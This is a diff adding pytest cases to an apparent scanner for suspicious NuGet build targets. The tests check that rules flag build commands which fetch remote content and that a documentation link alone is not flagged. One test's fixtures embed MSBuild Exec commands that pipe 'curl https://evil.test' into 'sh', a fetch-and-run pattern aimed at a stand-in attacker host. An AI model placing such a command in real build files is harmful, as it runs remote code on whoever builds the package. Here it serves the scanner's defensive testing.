@@ -693,6 +693,30 @@ def test_command_built_from_a_property_is_searched_through_the_file(make_nupkg):
     assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]
 
 
+@pytest.mark.parametrize("task", ["Error", "Warning", "Message", "Microsoft.Build.Tasks.Error"])
+def test_a_link_a_build_only_shows_does_not_make_a_built_command_fetch(make_nupkg, task):
+    # Microsoft.DotNet.ILCompiler: an Error points at https://aka.ms/... docs.
+    body = (
+        f'<Target Name="T"><{task} Text="see https://aka.ms/docs" />'
+        '<Exec Command="&quot;$(CppLinker)&quot; @link.rsp" /></Target>'
+    )
+    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
+    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]
+
+
+@pytest.mark.parametrize(
+    "group",
+    [
+        "<PropertyGroup><Message>curl https://evil.test</Message></PropertyGroup>",
+        '<ItemGroup><Error Include="curl https://evil.test" /></ItemGroup>',
+    ],
+)
+def test_a_property_or_item_named_like_a_shown_task_still_fetches(make_nupkg, group):
+    body = group + '<Target Name="T"><Exec Command="$(Message) @(Error) | sh" /></Target>'
+    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
+    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]
+
+
 @pytest.mark.parametrize(
     ("trusted", "rules"),
     [("true", ["BKT-NUGET-BUILD-003"]), ("$(Trust)", ["BKT-NUGET-BUILD-003"]), ("false", [])],
